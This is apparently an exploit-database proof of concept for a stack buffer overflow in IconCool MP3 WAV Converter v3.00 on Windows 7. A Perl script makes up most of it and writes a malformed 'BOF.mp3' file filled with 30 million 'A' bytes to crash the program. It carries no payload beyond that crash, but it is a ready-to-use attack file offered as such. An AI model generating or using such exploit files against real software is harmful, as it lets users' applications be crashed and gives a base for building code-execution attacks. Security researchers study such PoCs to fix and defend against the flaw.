# Exploit Title: IconCool MP3 WAV Converter Stack Buffer Overflow Vulnerability
# Date: 3/24/2013
# Exploit Author: G0li47h
# Vendor Homepage: http://www.iconcool.com
# Software Link: http://www.iconcool.com/insticoncoolmp3wavconverter.exe
# Version: v3.00 Build 120518
# Tested on: Windows 7 SP1


my $file= "BOF.mp3";
my $FILE;
my $junk = "\x41" x 30000000;


open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "File Created successfully\n";
